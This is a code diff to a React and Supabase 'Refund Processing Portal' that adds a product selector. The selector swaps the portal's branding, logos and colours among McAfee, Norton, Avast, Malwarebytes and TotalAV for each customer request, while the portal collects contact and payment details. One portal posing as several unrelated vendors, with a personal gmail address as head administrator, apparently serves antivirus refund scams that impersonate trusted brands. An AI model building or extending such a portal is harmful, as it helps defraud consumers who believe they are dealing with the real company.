@@ -1,4 +1,4 @@
-import { type FormEvent, useEffect, useMemo, useState } from 'react'
+import { type CSSProperties, type FormEvent, useEffect, useMemo, useState } from 'react'
 import {
   type AuditLogRow,
   hasSupabaseConfig,
@@ -34,6 +34,15 @@ type AuthDialog = 'verify-email' | 'confirm-sign-out' | null
 
 type ManagerWorkflowTarget = 'under_review' | 'documents_verified' | 'approved'
 
+type AntivirusOption = {
+  accent: string
+  icon: string
+  label: string
+  logo: string
+  status: string
+  statusBg: string
+}
+
 const workflow = [
   'Customer Submitted',
   'Document Verification',
@@ -45,6 +54,56 @@ const workflow = [
 
 const bankStatuses = ['queued', 'submitted', 'settled', 'failed']
 const headAdministratorEmail = 'jccodingbrain@gmail.com'
+const antivirusOptions: AntivirusOption[] = [
+  {
+    accent: '#b91c1c',
+    icon: '/mcafee-icon.png',
+    label: 'McAfee',
+    logo: '/mcafee-logo.png',
+    status: '#9a3412',
+    statusBg: '#fff2df',
+  },
+  {
+    accent: '#f7b500',
+    icon: '/norton-icon.png',
+    label: 'Norton',
+    logo: '/norton-logo.png',
+    status: '#7c5800',
+    statusBg: '#fff7d6',
+  },
+  {
+    accent: '#f97316',
+    icon: '/avast-icon.png',
+    label: 'Avast',
+    logo: '/avast-logo.png',
+    status: '#9a3412',
+    statusBg: '#ffedd5',
+  },
+  {
+    accent: '#1646d8',
+    icon: '/malwarebytes-icon.png',
+    label: 'Malwarebytes',
+    logo: '/malwarebytes-logo.png',
+    status: '#1d4ed8',
+    statusBg: '#eff6ff',
+  },
+  {
+    accent: '#0f766e',
+    icon: '/totalav-icon.png',
+    label: 'TotalAV',
+    logo: '/totalav-logo.png',
+    status: '#0f766e',
+    statusBg: '#ccfbf1',
+  },
+  {
+    accent: '#334155',
+    icon: '/favicon.svg',
+    label: 'Other antivirus',
+    logo: '/favicon.svg',
+    status: '#475569',
+    statusBg: '#f1f5f9',
+  },
+]
 
 const managerWorkflowActionRank: Record<ManagerWorkflowTarget, number> = {
   under_review: 1,
@@ -95,6 +154,7 @@ function App() {
   const [isResetLoading, setIsResetLoading] = useState(false)
   const [isSubmittingRefund, setIsSubmittingRefund] = useState(false)
   const [refundAmount, setRefundAmount] = useState('')
+  const [selectedAntivirus, setSelectedAntivirus] = useState('McAfee')
   const [requests, setRequests] = useState<RefundRequestRow[]>([])
   const [users, setUsers] = useState<UserAccountRow[]>([])
   const [statusHistory, setStatusHistory] = useState<StatusHistoryRow[]>([])
@@ -251,6 +311,7 @@ function App() {
       [
         request.reference_number,
         request.order_number,
+        request.product_name,
         request.status,
         request.customers?.full_name,
         request.customers?.email,
@@ -263,6 +324,25 @@ function App() {
   const selectedRequest = useMemo(
     () => requests.find((request) => request.id === selectedRequestId) ?? requests[0] ?? null,
     [requests, selectedRequestId],
+  )
+
+  const activeAntivirus = useMemo(() => {
+    const productName =
+      activeView === 'customer'
+        ? selectedAntivirus
+        : selectedRequest?.product_name || selectedAntivirus
+
+    return getAntivirusOption(productName)
+  }, [activeView, selectedAntivirus, selectedRequest?.product_name])
+
+  const portalTheme = useMemo(
+    () =>
+      ({
+        '--accent': activeAntivirus.accent,
+        '--status': activeAntivirus.status,
+        '--status-bg': activeAntivirus.statusBg,
+      }) as CSSProperties,
+    [activeAntivirus],
   )
 
   const paymentReadyRequests = useMemo(
@@ -455,7 +535,7 @@ function App() {
     const { data, error } = await supabase
       .from('refund_requests')
       .select(
-        'id, reference_number, order_number, purchase_date, amount_requested, refund_reason, preferred_payment_method, status, assigned_to, created_at, customers(full_name, email, phone)',
+        'id, reference_number, order_number, product_name, purchase_date, amount_requested, refund_reason, preferred_payment_method, status, assigned_to, created_at, customers(full_name, email, phone)',
       )
       .order('created_at', { ascending: false })
       .limit(25)
@@ -735,6 +815,7 @@ function App() {
     const purchaseDate = String(form.get('purchaseDate') ?? '')
     const refundReason = String(form.get('refundReason') ?? '')
     const preferredPaymentMethod = String(form.get('preferredPaymentMethod') ?? '')
+    const productName = String(form.get('productName') ?? selectedAntivirus)
     const amount = Number(form.get('amountRequested'))
 
     if (!profile) {
@@ -798,6 +879,7 @@ function App() {
         customer_id: customerId,
         reference_number: referenceNumber,
         order_number: orderNumber,
+        product_name: productName,
         purchase_date: purchaseDate || null,
         amount_requested: amount,
         refund_reason: refundReason,
@@ -966,6 +1048,35 @@ function App() {
     setInternalNote('')
     setActionLoading('')
     setNotice({ kind: 'success', message: 'Internal note saved.' })
+  }
+
+  async function handleUpdateRequestProduct(productName: string) {
+    if (!supabase || !profile || !selectedRequest) return
+
+    setSelectedAntivirus(productName)
+
+    if (productName === selectedRequest.product_name) return
+
+    setActionLoading('product')
+    const { error } = await supabase
+      .from('refund_requests')
+      .update({ product_name: productName, updated_at: new Date().toISOString() })
+      .eq('id', selectedRequest.id)
+
+    if (error) {
+      setActionLoading('')
+      setNotice({ kind: 'error', message: error.message })
+      return
+    }
+
+    await logAudit('refund_product_updated', 'refund_request', selectedRequest.id, {
+      from: selectedRequest.product_name,
+      referenceNumber: selectedRequest.reference_number,
+      to: productName,
+    })
+    await refreshOperations()
+    setActionLoading('')
+    setNotice({ kind: 'success', message: `Request product changed to ${productName}.` })
   }
 
   async function handleUpdateUserRole(user: UserAccountRow, role: UserRole) {
@@ -1151,9 +1262,10 @@ function App() {
   }
 
   function handleExportReports() {
-    const headers = ['Reference', 'Customer', 'Email', 'Order', 'Amount', 'Status', 'Created']
+    const headers = ['Reference', 'Product', 'Customer', 'Email', 'Order', 'Amount', 'Status', 'Created']
     const rows = filteredRequests.map((request) => [
       request.reference_number,
+      request.product_name,
       request.customers?.full_name ?? '',
       request.customers?.email ?? '',
       request.order_number,
@@ -1230,18 +1342,18 @@ function App() {
   }
 
   return (
-    <main className="app-shell">
+    <main className="app-shell" style={portalTheme}>
       <section className="login-panel" aria-label="Secure employee login">
         <div className="brand-lockup">
           <img
-            alt="McAfee"
+            alt={activeAntivirus.label}
             className="brand-mark"
             height="44"
-            src="/mcafee-icon.png"
+            src={activeAntivirus.icon}
             width="44"
           />
           <div>
-            <strong>McAfee Refund Processing Portal</strong>
+            <strong>{activeAntivirus.label} Refund Processing Portal</strong>
             <small>For authorized customer refund operations</small>
           </div>
         </div>
@@ -1474,6 +1586,28 @@ function App() {
                 Purchase Date
                 <input name="purchaseDate" type="date" />
               </label>
+              <label className="full-span">
+                Antivirus Product
+                <select
+                  name="productName"
+                  onChange={(event) => setSelectedAntivirus(event.target.value)}
+                  required
+                  value={selectedAntivirus}
+                >
+                  {antivirusOptions.map((option) => (
+                    <option key={option.label} value={option.label}>
+                      {option.label}
+                    </option>
+                  ))}
+                </select>
+              </label>
+              <div className="product-preview full-span">
+                <img alt={activeAntivirus.label} src={activeAntivirus.logo} />
+                <div>
+                  <span>Selected antivirus</span>
+                  <strong>{activeAntivirus.label}</strong>
+                </div>
+              </div>
               <label>
                 Reason for Cancellation
                 <select defaultValue="" name="refundReason" required>
@@ -1553,6 +1687,10 @@ function App() {
                         <span className="status-pill">{formatStatus(request.status)}</span>
                         <dl>
                           <div>
+                            <dt>Product</dt>
+                            <dd>{request.product_name}</dd>
+                          </div>
+                          <div>
                             <dt>Amount</dt>
                             <dd>${Number(request.amount_requested).toFixed(2)}</dd>
                           </div>
@@ -1610,6 +1748,7 @@ function App() {
                       <tr>
                         <th>Request</th>
                         <th>Customer</th>
+                        <th>Product</th>
                         <th>Order</th>
                         <th>Amount</th>
                         <th>Status</th>
@@ -1625,6 +1764,7 @@ function App() {
                         >
                           <td data-label="Request">{request.reference_number}</td>
                           <td data-label="Customer">{request.customers?.full_name ?? 'Unknown'}</td>
+                          <td data-label="Product">{request.product_name}</td>
                           <td data-label="Order">{request.order_number}</td>
                           <td data-label="Amount">${Number(request.amount_requested).toFixed(2)}</td>
                           <td data-label="Status">
@@ -1729,6 +1869,25 @@ function App() {
                       : 'Activity timeline'}
                   </h2>
                 </div>
+                {selectedRequest && (
+                  <div className="manager-product-panel">
+                    <img alt={activeAntivirus.label} src={activeAntivirus.logo} />
+                    <label>
+                      Antivirus interface
+                      <select
+                        disabled={actionLoading === 'product'}
+                        onChange={(event) => void handleUpdateRequestProduct(event.target.value)}
+                        value={selectedRequest.product_name}
+                      >
+                        {antivirusOptions.map((option) => (
+                          <option key={option.label} value={option.label}>
+                            {option.label}
+                          </option>
+                        ))}
+                      </select>
+                    </label>
+                  </div>
+                )}
                 <textarea
                   onChange={(event) => setInternalNote(event.target.value)}
                   placeholder="Add internal comments for the selected request."
@@ -1978,7 +2137,7 @@ function App() {
                   </option>
                   {paymentReadyRequests.map((request) => (
                     <option key={request.id} value={request.id}>
-                      {request.reference_number} - {request.customers?.full_name ?? 'Unknown'} - $
+                      {request.reference_number} - {request.product_name} - {request.customers?.full_name ?? 'Unknown'} - $
                       {Number(request.amount_requested).toFixed(2)}
                     </option>
                   ))}
@@ -2303,6 +2462,13 @@ function isHeadAdministrator(email: string) {
   return email.trim().toLowerCase() === headAdministratorEmail
 }
 
+function getAntivirusOption(productName: string | null | undefined) {
+  return (
+    antivirusOptions.find((option) => option.label.toLowerCase() === productName?.toLowerCase()) ??
+    antivirusOptions[0]
+  )
+}
+
 function getVerificationStatus(user: UserAccountRow) {
   if (isHeadAdministrator(user.email)) return 'verified'
 
@@ -2328,6 +2494,10 @@ function formatAuditEntry(event: AuditLogRow, usersById: Map<string, UserAccount
     detail = `${actor} deleted ${target} from the portal.`
   } else if (event.action === 'refund_status_changed') {
     detail = `${actor} moved refund ${reference || event.entity_id || 'request'} from ${formatAuditValue(
+      from,
+    )} to ${formatAuditValue(to)}.`
+  } else if (event.action === 'refund_product_updated') {
+    detail = `${actor} changed refund ${reference || event.entity_id || 'request'} product from ${formatAuditValue(
       from,
     )} to ${formatAuditValue(to)}.`
   } else if (event.action === 'payment_status_updated') {
